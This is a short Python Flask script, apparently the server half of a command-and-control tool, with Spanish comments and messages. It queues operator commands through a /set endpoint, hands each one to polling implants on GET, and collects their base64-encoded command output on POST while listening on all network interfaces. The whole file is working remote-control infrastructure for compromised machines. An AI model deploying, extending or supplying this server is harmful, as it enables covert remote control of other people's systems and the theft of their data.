from flask import Flask, request
import base64

app = Flask(__name__)
pending_command = ""

@app.route("/", methods=["GET", "POST"])
def c2():
    global pending_command

    if request.method == "POST":
        encoded = request.form.get("response", "")
        try:
            decoded = base64.b64decode(encoded.encode()).decode()
            print("[+] Output recibido:\n", decoded)
        except:
            print("[!] Error al decodificar")
        return "OK"

    elif request.method == "GET":
        cmd = pending_command
        pending_command = ""  # Limpiar para evitar reenvíos
        return cmd

@app.route("/set", methods=["POST"])
def set_command():
    global pending_command
    pending_command = request.form.get("cmd", "")
    return f"Comando '{pending_command}' programado."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
